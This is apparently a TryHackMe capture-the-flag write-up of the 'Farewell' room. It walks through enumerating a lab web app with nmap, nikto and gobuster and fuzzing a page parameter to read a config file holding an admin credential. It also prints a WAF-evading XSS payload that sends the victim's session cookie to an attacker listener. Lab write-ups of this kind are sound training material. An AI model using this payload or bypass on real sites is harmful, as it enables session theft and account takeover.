<h1 align="center">Farewell</h1>
<p align="center">2025, November 23  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>2</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Use red-teaming techniques to bypass the WAF and obtain admin access to the web application. &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/farewell">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/2560eade-3a10-4d5a-bbb5-be7cb4b7dcef"></p>

<h2>1 . Farewell</h2>
<p><em>The farewell server will be decommissioned in less than 24 hours. Everyone is asked to leave one last message, but the admin panel holds all submissions. Can you sneak into the admin area and read every farewell message before the lights go out?</em>

Note: In case you want to start over or restart all services, visit <code>http://MACHINE_IP/status.php</code>.</p>

<p><em>Answer the questions below</em></p>

```bash
:~# nmap -sT -p- -T4 xx.xx.xxx.xxx
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


```bash
:~/Padelify# nmap -sC -sV -Pn -p22,80 -T4 xx.xx.xxx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Padelify - Tournament Registration
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
:~/Padelify# nikto -h http://xx.xx.xxx.xxx/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xx.xxx.xxx
+ Target Hostname:    xx.xx.xxx.xxx
+ Target Port:        80
+ Start Time:         2025-11-24 xx:xx:xx (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ Server leaks inodes via ETags, header found with file /uBIt4gvr.ini, fields: 0xb38 0x643139370245f 
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /config/: Directory indexing found.
+ /config/: Configuration information may be available remotely.
+ OSVDB-3268: /logs/: Directory indexing found.
+ OSVDB-3092: /logs/: This might be interesting...
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-11-24 xx:xx:xx (GMT0) (11 seconds)
------------------------------------------
```

<p>

- /logs/error.log</p>

```bash
:~# dirsearch -u http:// xx.xx.xxx.xxx/logs/

...
[xx:xx:xx] 200 -    1KB - /logs/error.log

Task Completed
```

<img width="1128" height="519" alt="image" src="https://github.com/user-attachments/assets/9d0d00b3-15c1-42f7-bc92-717b5e8abb9f" />

<br>
<br>

```bash
[Sat Nov 08 12:03:11.123456 2025] [info] [pid 2345] Server startup: Padelify v1.4.2
[Sat Nov 08 12:03:11.123789 2025] [notice] [pid 2345] Loading configuration from /var/www/html/config/app.conf
[Sat Nov 08 12:05:02.452301 2025] [warn] [modsec:99000005] [client 10.10.84.50:53122] NOTICE: Possible encoded/obfuscated XSS payload observed
[Sat Nov 08 12:08:12.998102 2025] [error] [pid 2361] DBWarning: busy (database is locked) while writing registrations table
[Sat Nov 08 12:11:33.444200 2025] [error] [pid 2378] Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format
[Sat Nov 08 12:12:44.777801 2025] [notice] [pid 2382] Moderator login failed: 3 attempts from 10.10.84.99
[Sat Nov 08 12:13:55.888902 2025] [warn] [modsec:41004] [client 10.10.84.212:53210] Double-encoded sequence observed (possible bypass attempt)
[Sat Nov 08 12:14:10.101103 2025] [error] [pid 2391] Live feed: cannot bind to 0.0.0.0:9000 (address already in use)
[Sat Nov 08 12:20:00.000000 2025] [info] [pid 2401] Scheduled maintenance check completed; retention=30 days
```

<p>

- web port 80</p>

<img width="1103" height="525" alt="image" src="https://github.com/user-attachments/assets/1f5c260d-7ec2-4273-b779-08720ac91e4d" />
<p>

- /login.php</p>

<img width="1130" height="441" alt="image" src="https://github.com/user-attachments/assets/52a5ff36-65a5-4d0b-a33b-2bfbc3127f36" />

<p>

- /uBIt4gvr.ini</p>


<img width="1126" height="524" alt="image" src="https://github.com/user-attachments/assets/de8067bb-77ca-4dbf-83e1-e67503e4e2a7" />

<br>
<br>
<p>

- status.php</p>

<img width="1119" height="658" alt="image" src="https://github.com/user-attachments/assets/f1bc9827-20c3-4662-9489-3548e3164c38" />


<br>
<br>
<p>

- /login.php</p>

<img width="1121" height="223" alt="image" src="https://github.com/user-attachments/assets/2a77b4bb-8cbe-47b4-9389-a7f295b72778" />


<br>
<br>
<p>

- test</p>

<img width="1122" height="459" alt="image" src="https://github.com/user-attachments/assets/ec9e405b-6dab-4dbd-85bb-3a0d4b81d884" />

<br>
<br>
<p>
  
- User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</p>

```bash
:~/Padelify# gobuster dir -u http://xx.xx.xxx.xxx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a Mozilla/5.0
```

<img width="1325" height="641" alt="image" src="https://github.com/user-attachments/assets/d0d0281a-5aa8-4ee3-803b-11de5fd162e2" />

<br>
<br>

```bash
:~/Padelify# gobuster dir -u http://xx.xx.xxx.xxx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a Mozilla/5.0 -x php,js,ini --exclude-lenght 2872
...
/index.php            (Status: 200) [Size: 3853]
/login.php            (Status: 200) [Size: 1124]
/register.php         (Status: 302) [Size: 0] [--> index.php]
/header.php           (Status: 200) [Size: 1587]
/footer.php           (Status: 200) [Size: 33]
/css                  (Status: 301) [Size: 312] [--> http://xx.xx.xxx.xxx/css/]
/live.php             (Status: 200) [Size: 1961]
/status.php           (Status: 200) [Size: 4086]
/js                   (Status: 301) [Size: 311] [--> http://xx.xx.xxx.xxx/js/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config               (Status: 301) [Size: 315] [--> http://xx.xx.xxx.xxx/config/]
/logs                 (Status: 301) [Size: 313] [--> http://xx.xx.xxx.xxx/logs/]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/match.php            (Status: 200) [Size: 126]
/change_password.php  (Status: 302) [Size: 0] [-->
...
```

<img width="1338" height="555" alt="image" src="https://github.com/user-attachments/assets/79628024-c75a-46ae-9807-5b9358af0c6b" />


<br>
<br>


<img width="1316" height="333" alt="image" src="https://github.com/user-attachments/assets/c46c2d81-1406-4adf-9fbc-105d8f942aef" />

<br>
<br>

<img width="1319" height="251" alt="image" src="https://github.com/user-attachments/assets/b88a1c22-4ec1-49bd-8cf6-0ff04b4bd455" />


<p>
  
- XSS<br>
- <code><script>var i=new Image();i.src="http://xx.xx.xxx.xxx:9001/?c="+document["coo"+"kie"]</script></code><br>
- <code>GET /?c=PHPSESSID=..........................</p>

<img width="1319" height="259" alt="image" src="https://github.com/user-attachments/assets/62ca4e96-0ffb-4ab2-ae05-b91e4cdc921a" />

<p>

- substitute cookie<br>
- refresh</p>

<img width="832" height="706" alt="image" src="https://github.com/user-attachments/assets/505f6c95-dcf5-4617-9c90-8595480608e8" />


<br>
<br>
<p>1.1. <em>What is the flag value after logging in as a moderator?</em><br>
<code>THM{...................}</code></p>
<br>
<br>

<p>

- change password</p>

```bash
:~/Padelify# gobuster fuzz -u http://xx.xx.xxx.xxx/live.php?page=FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a Mozilla/5.0 --exclude-length 335,1907
...
Found: [Status=200] [Length=1835] [Word=css] http://xx.xx.xxx.xxx/live.php?page=css

Found: [Status=200] [Length=1835] [Word=js] http://xx.xx.xxx.xxx/live.php?page=js

Found: [Status=200] [Length=1835] [Word=config] http://xx.xx.xxx.xxx/live.php?page=config

Found: [Status=200] [Length=1835] [Word=logs] http://xx.xx.xxx.xxx/live.php?page=logs
...
```

```bash
:~/Padelify# gobuster fuzz -u http://xx.xx.xxx.xxx/live.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -a Mozilla/5.0 --exclude-length 1907
...
Found: [Status=200] [Length=1835] [Word=config] http://xx.xx.xxx.xxx/live.php?page=config

Found: [Status=200] [Length=1835] [Word=css] http://xx.xx.xxx.xxx/live.php?page=css

Found: [Status=400] [Length=335] [Word=Documents and Settings] http://xx.xx.xxx.xxx/live.php?page=Documents and Settings

Found: [Status=200] [Length=5688] [Word=index.php] http://xx.xx.xxx.xxx/live.php?page=index.php

Found: [Status=200] [Length=1835] [Word=js] http://xx.xx.xxx.xxx/live.php?page=js

Found: [Status=200] [Length=1835] [Word=logs] http://xx.xx.xxx.xxx/live.php?page=logs

Found: [Status=403] [Length=2872] [Word=php.ini] http://xx.xx.xxx.xxx/live.php?page=php.ini

Found: [Status=400] [Length=335] [Word=Program Files] http://xx.xx.xxx.xxx/live.php?page=Program Files

Found: [Status=400] [Length=335] [Word=reports list] http://xx.xx.xxx.xxx/live.php?page=reports list


```

<img width="1305" height="572" alt="image" src="https://github.com/user-attachments/assets/2ae845b5-3916-4780-9bfb-2a88c7340ce2" />

<br>
<br>

<img width="820" height="362" alt="image" src="https://github.com/user-attachments/assets/de4c7b94-a0d8-4854-9d2a-f6c0865a03a8" />


bL}8,S9W1o44

version = "1.4.2" enable_live_feed = true enable_signup = true env = "staging" site_name = "Padelify Tournament Portal" max_players_per_team = 4 maintenance_mode = false log_level = "INFO" log_retention_days = 30 db_path = "padelify.sqlite" admin_info = "bL}8,S9W1o44" misc_note = "do not expose to production" support_email = "support@padelify.thm" build_hash = "a1b2c3d4" 


<img width="825" height="455" alt="image" src="https://github.com/user-attachments/assets/b4869dde-0fa9-4b42-9552-356fe1bdb425" />

<br>
<br>

<img width="837" height="449" alt="image" src="https://github.com/user-attachments/assets/1dd10630-3d5a-48eb-a18b-0610d037b38e" />

<br>
<br>

<img width="836" height="731" alt="image" src="https://github.com/user-attachments/assets/d32da520-cfce-4580-9cd8-d89a6210d958" />

<br>
<br>
<p>1.2. <em>What is the flag value after logging in as admin?</em><br>
<code>THM{..................}</code></p>

<img width="1896" height="877" alt="image" src="https://github.com/user-attachments/assets/3f4a4e47-9459-42f7-af27-bb0c2827bdf3" />

<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3f4a4e47-9459-42f7-af27-bb0c2827bdf3"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/eafd18ff-9b5c-436b-ac16-10cd2a79fc95"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, November</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|23      |Medium 🚩 - Padelify                   |   2    |      93ʳᵈ    |     3ʳᵈ    |     436ᵗʰ   |      6ᵗʰ     |    133,976  |    1,033    |    80     |
|23      |Medium 🚩 - Farewell                   |   2    |      93ʳᵈ    |     3ʳᵈ    |     483ʳᵈ   |      6ᵗʰ     |    133,886  |    1,032    |    80     |
|23      |Medium 🔗 - WAF: Exploitation Techniques|  2    |      92ⁿᵈ    |     3ʳᵈ    |     516ᵗʰ   |      6ᵗʰ     |    133,826  |    1,031    |    80     |
|22      |Hard 🚩 - The Last Trial               |   1    |      91ˢᵗ    |     3ʳᵈ    |     532ⁿᵈ   |      6ᵗʰ     |    133,762  |    1,030    |    80     |
|22      |Medium 🔗 - Data Integrity & Model Poisoning|   1|     94ᵗʰ    |     3ʳᵈ    |     762ⁿᵈ   |      7ᵗʰ     |    133,492  |    1,029    |    80     |
|22      |Easy 🔗 - LLM Output Handling and Privacy Risks|   1|  94ᵗʰ    |     3ʳᵈ    |     809ᵗʰ   |      7ᵗʰ     |    133,444  |    1,028    |    80     |
|22      |Easy 🔗 - Advent of Cyber Prep Track   |   1    |      94ᵗʰ    |     3ʳᵈ    |     826ᵗʰ   |      8ᵗʰ     |    133,428  |    1,027    |    80     |
|19      |Easy 🔗 - WAF: Introduction            |   2    |      91ˢᵗ    |     3ʳᵈ    |     737ᵗʰ   |      7ᵗʰ     |    133,348  |    1,026    |    80     |
|19      |Easy 🔗 - Django: CVE-2025-64459       |   2    |      93ʳᵈ    |     3ʳᵈ    |     877ᵗʰ   |      8ᵗʰ     |    133,224  |    1,025    |    80     |
|19      |Easy 🔗 - Django: CVE-2025-64459       |   2    |      93ʳᵈ    |     3ʳᵈ    |     877ᵗʰ   |      8ᵗʰ     |    133,224  |    1,025    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Insecure Data Handling| 1        |      93ʳᵈ    |     3ʳᵈ    |     894ᵗʰ   |      8ᵗʰ     |    132,207  |    1,024    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: Application Design Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     927ᵗʰ   |      8ᵗʰ     |    132,183  |    1,023    |    80     |
|18      |Easy 🔗 - OWASP Top 10 2025: IAAA Failures| 1   |      93ʳᵈ    |     3ʳᵈ    |     971ˢᵗ   |      8ᵗʰ     |    132,151  |    1,022    |    80     |
|14      |Hard 🚩 - Shock and Silence            |   1    |      94ᵗʰ    |     4ᵗʰ    |     749ᵗʰ   |      7ᵗʰ     |    133,095  |    1,021    |    80     |
|14      |Easy 🔗 - Input Manipulation & Prompt Injection| 1 |   95ᵗʰ    |     4ᵗʰ    |   1,290ᵗʰ   |     12ⁿᵈ     |    132,822  |    1,020    |    80     |
|14      |Hard 🚩 - CRM Snatch                   |   1    |      95ᵗʰ    |     4ᵗʰ    |   1,526ᵗʰ   |     12ⁿᵈ     |          -  |    1,019    |    80     |
|8       |Easy 🔗 - Living of the Land Attacks   |   1    |      91ˢᵗ    |     4ᵗʰ    |   1,759ᵗʰ   |     17ᵗʰ     |    132,642  |    1,018    |    80     |
|8       |Hard 🚩 - Lost in RAMslation           |   1    |      91ˢᵗ    |     4ᵗʰ    |   2,547ᵗʰ   |     25ᵗʰ     |    132,580  |    1,017    |    80     |
|8       |Easy 🔗 - MITRE                        |   1    |       -      |     4ᵗʰ    |      -      |      -       |          -  |       -     |    80     |

</h6></div><br>


<p align="center">Global All Time:     93ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/8667fc76-5323-45be-b11f-fa3f586351e7"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/b7149f70-2b5e-4f65-9b56-21d16d1f2d06"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/d30d53d8-7121-4f6b-8938-c048d8a63b27"><br><br>
                  Global monthly:    436ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b6715bea-8e27-47cc-a4f7-22d9c36ef2a2"><br><br>
                  Brazil monthly:       6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/08c6f550-d4d8-4d78-a12d-4f46a1458ab1"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
